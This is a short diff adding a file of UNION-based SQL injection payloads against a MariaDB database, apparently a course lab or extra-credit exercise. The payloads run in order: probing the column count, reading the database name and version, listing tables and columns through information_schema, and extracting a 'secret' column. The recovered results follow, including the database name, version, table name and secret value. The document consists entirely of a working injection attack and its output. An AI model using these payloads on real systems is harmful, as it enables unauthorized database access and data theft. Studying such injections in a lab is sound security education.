@@ -1,0 +1,11 @@
+' UNION SELECT NULL,NULL,NULL#
+' UNION SELECT 1,2,3#
+' UNION SELECT NULL,database(),@@version#
+' UNION SELECT NULL,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()#
+' UNION SELECT NULL,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='SECRETTABLE'#
+' UNION SELECT NULL,secret,3 FROM SECRETTABLE#
+
+Name: proj2_xtra_cr3dit
+Version: 10.5.12-MariaDB-0+deb11u1
+Tables: SECRETTABLE
+Secret: hunter2
